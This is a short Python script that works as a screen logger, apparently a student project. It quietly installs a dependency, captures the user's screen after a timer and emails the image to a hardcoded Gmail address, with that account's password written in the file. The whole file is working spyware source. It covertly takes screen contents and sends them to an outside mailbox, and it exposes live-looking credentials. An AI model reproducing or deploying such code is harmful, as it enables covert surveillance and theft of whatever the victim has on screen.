try:
    import os
    import threading
    import pyscreenshot
    from mail import send_mail
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot"]
    call("pip install " + ' '.join(modules), shell=True)
finally:
    EMAIL_ADDRESS = "sudeeproy67@gmail.com"
    EMAIL_PASSWORD = "nusrpvxakgvnhefp"
    FILENAME = "C:/Users/sudee/ISAA/output.png"
    SEND_REPORT_EVERY = 30 

    class screen_logger: 
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "System Details"
            self.email = email
            self.password = password

        def save_image(self):
            image = pyscreenshot.grab()
            image.save(FILENAME)
            send_mail(self.email, self.password, FILENAME)
            
        def run(self):
            timer = threading.Timer(self.interval, self.save_image)
            timer.start()

    Screenlogger = screen_logger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    Screenlogger.run()